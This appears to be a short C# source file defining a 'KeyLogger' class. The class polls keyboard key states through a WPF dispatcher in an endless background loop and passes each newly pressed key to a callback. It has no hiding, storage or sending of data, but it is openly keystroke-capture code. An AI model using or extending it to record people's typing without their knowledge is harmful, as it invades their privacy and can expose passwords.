using System;
using System.Windows.Input;
using System.Threading.Tasks;
using System.Windows.Threading;
using System.Collections.Generic;

namespace keylogger
{
    public class KeyLogger
    {            
        public List<Key>LoggerKeys { get; set; }

        private Dictionary<Key, bool> Keys;

        public bool Start { get; private set; }  

        public KeyLogger()
        {
            Keys = new Dictionary<Key, bool>();
            for (int i = 1; i < 172; i++)
            {
                Keys.Add((Key)i, true);
            }
            Start = false;
            LoggerKeys = new List<Key>();
        }

        public void KeyHook(Action<Key> LogKeys, Dispatcher dispatcher)
        {
            Task.Run(() =>
            {
                if (Start)
                    return;

                Start = true;
                try
                {
                    while (true)
                    {
                        foreach (var key in Keys)
                        {
                            dispatcher.Invoke(() =>
                            {
                                if (Keyboard.IsKeyDown(key.Key) && key.Value == true)
                                {
                                    LogKeys(key.Key);
                                    Keys[key.Key] = false;
                                }
                                if (Keyboard.IsKeyUp(key.Key))
                                {
                                    Keys[key.Key] = true;
                                }
                            });
                        }
                    }
                }
                catch (Exception e)
                {
                    Start = false;
                    return;
                }
            });
        }
    }
}